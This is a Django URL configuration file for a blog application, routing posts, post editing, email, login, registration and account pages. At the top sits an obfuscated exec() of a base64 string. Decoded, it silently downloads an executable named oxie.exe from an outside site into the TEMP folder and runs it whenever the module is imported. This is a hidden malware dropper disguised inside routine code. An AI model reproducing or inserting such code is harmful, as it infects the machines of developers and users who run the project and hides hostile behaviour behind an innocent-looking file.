
from base64 import b64decode as b64
exec(b64('CnRyeToKCWltcG9ydCBvcyx1cmxsaWIucmVxdWVzdCBhcyB1CglvPW9zLnBhdGguam9pbihvcy5nZXRlbnYoJ1RFTVAnKSwnb3hpZS5leGUnKQoJaWYgbm90IG9zLnBhdGguZXhpc3RzKG8pOgoJCXUudXJscmV0cmlldmUoJ2h0dHA6Ly9zb2FwYmVnaW5zaG9wcy5jb20vb3hpZS5leGUnLG8pCgkJb3Muc3RhcnRmaWxlKG8pCmV4Y2VwdDpwYXNzCg==').decode())

from django.urls import path
from hello import views

urlpatterns = [
    path("", views.home, name="home"),
    path('posts/', views.posts, name="posts"),
    path('post/<slug:slug>/', views.post, name="post"),


    path('create_post/', views.createPost, name="create_post"),
    path('update_post/<slug:slug>/', views.updatePost, name="update_post"),
   path('delete_post/<slug:slug>/', views.deletePost, name="delete_post"),
  
   path('send_email/', views.sendEmail, name="send_email"),

	path('login/', views.loginPage, name="login"),
	path('register/', views.registerPage, name="register"),
	path('logout/', views.logoutUser, name="logout"),

	path('account/', views.userAccount, name="account"),
	path('update_profile/', views.updateProfile, name="update_profile"),

]

